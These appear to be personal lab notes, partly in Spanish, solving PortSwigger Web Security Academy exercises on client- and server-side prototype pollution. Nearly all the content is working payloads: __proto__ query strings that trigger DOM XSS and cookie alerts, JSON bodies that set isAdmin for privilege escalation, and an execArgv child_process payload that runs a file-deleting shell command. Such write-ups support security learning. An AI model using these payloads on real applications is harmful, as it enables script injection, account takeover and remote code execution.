## Lab: DOM XSS via client-side prototype pollution

```
https://0aaa00a2038c23b280a8c14d00af0065.web-security-academy.net/?__proto__[transport_url]=data:,alert(1)//
```

## Lab: DOM XSS via an alternative prototype pollution vector

```
https://0a380066031efa1b819793ff00270007.web-security-academy.net/?__proto__.sequence=1)};alert(1)//
```

## Lab: Client-side prototype pollution via flawed sanitization

```
https://0a2800ae036eec578052175d0038008b.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1)
```

## Lab: Client-side prototype pollution in third-party libraries

Con ayuda de DOM invader se identifico el exploit luego en el exploit server 


![[Pasted image 20251122235224.png]]

```
<script>
window.location = 'https://0a5e00b103283a02a8890898008f00a6.web-security-academy.net/?_proto__[hitCallBack]=alert%281%29#_proto__%5BhitCallBack%5D=alert%281%29&__proto__[hitCallback]=alert%28document.cookie%29'; 
</script>
```

## Lab: Client-side prototype pollution via browser APIs

```
https://0a91006203ac4abd8069c2f8007f0097.web-security-academy.net/?__proto__[value]=data:,alert(1)
```

## Lab: Privilege escalation via server-side prototype pollution

![[Pasted image 20251123011011.png]]

## Lab: Detecting server-side prototype pollution without polluted property reflection

```
{
	"address_line_1":"test",
	"address_line_2":"test",
	"city":"test",
	"postcode":"test",
	"country":"test",
	"sessionId":"bjiljiDf8AXKdyus8YYePG6WgqQTgBjP", 
	"__proto__": {
		"status" : "450"
	}
}
```

## Lab: Bypassing flawed input filters for server-side prototype pollution

```
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"RZ8tFUiGo3M6er407ZyHZ7J22nh49Crz",
	"constructor": {
		"prototype": {
			"isAdmin": true
		}
	}
}
```


## Lab: Remote code execution via server-side prototype pollution

Identificarlo mediante JSON spaces override 
```
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"ui3BhDmuHjqyxUvLPAawvBKrUn8E346p",
	"__proto__": {
		"json spaces": 100
	}
}
```

Explotando 

```
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"Ip2H3tcqBGZHujd41S97beFkftyKxtn4", 
	"__proto__": {
		"execArgv": [
			"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]
		}
	}
```

